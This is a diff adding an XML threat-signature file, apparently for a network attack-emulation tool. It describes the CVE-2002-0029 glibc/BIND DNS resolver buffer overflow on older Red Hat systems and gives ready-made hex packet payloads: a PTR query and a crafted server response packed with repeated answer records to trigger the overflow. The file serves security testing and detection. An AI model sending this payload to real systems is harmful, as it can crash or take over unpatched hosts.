@@ -1,0 +1,97 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Red Hat Enterprise Linux DNS Resolver Buffer Overflow"/>
+    <EngDesc display="true" value="A vulnerability exists in the DNS stub resolver library in ISC BIND that also affects the resolver component of older versions of the glibc library. This vulnerability has been known for some time, but has gone unfixed in several versions of the Red Hat Linux operating systems until recently. This can allow an attacker to send a malicious DNS response packets to a vulnerable system to cause a denial of service condition or execution of arbitrary code."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="DNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="GNU_project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="GNU_project_GNU_project_glibc"/>
+      <item value="GNU_project_GNU_project_Linux"/>
+      <item value="GNU_project_GNU_project_Enterprise_Linux_AS"/>
+      <item value="GNU_project_GNU_project_Enterprise_Linux_ES"/>
+      <item value="GNU_project_GNU_project_Linux_Advanced_Workstation_for_the_Itanium_processor"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="GNU_project_glibc_2.3.1_and_prior"/>
+      <item value="GNU_project_Linux_6.0_(glibc_2.1.1)"/>
+      <item value="GNU_project_Linux_6.1_(glibc_2.1.2)"/>
+      <item value="GNU_project_Linux_6.2_(glibc-2.1.3)"/>
+      <item value="GNU_project_Linux_7.0_(glibc_2.1.92)"/>
+      <item value="GNU_project_Linux_7.1_(glibc_2.2.2)"/>
+      <item value="GNU_project_Linux_7.2_(glibc_2.2.4)"/>
+      <item value="GNU_project_Linux_7.3_(glibc-2.2.5)"/>
+      <item value="GNU_project_Linux_8.0_(glibc-2.2.93)"/>
+      <item value="GNU_project_Enterprise_Linux_AS_2.1_(glibc_2.2.4)"/>
+      <item value="GNU_project_Enterprise_Linux_ES_2.1_(glibc_2.2.4)"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040806-01"/>
+    <CVEID display="true" value="CVE-2002-0029"/>
+    <bugtraqID display="true" value="6186"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="d352c4adf77dab86111bda8b08243677"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602640038593750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213725119" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0046" Identification="CD29" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="56DA" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$DNSdestPort" checksum="0" length="" Payload="D3A90100000100000000000001300130033136380331393207696E2D61646472046172706100000C0001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="038D" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="20BD" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <UDP srcPort="" destPort="" checksum="0" length="" Payload="D3A98580000100320001000101300130033136380331393207696E2D61646472046172706100000C0001C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00C000C0001000151800004026E3100C00E0002000100015180000B096C6F63616C686F737400C0EA000100010001518000047F000001"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
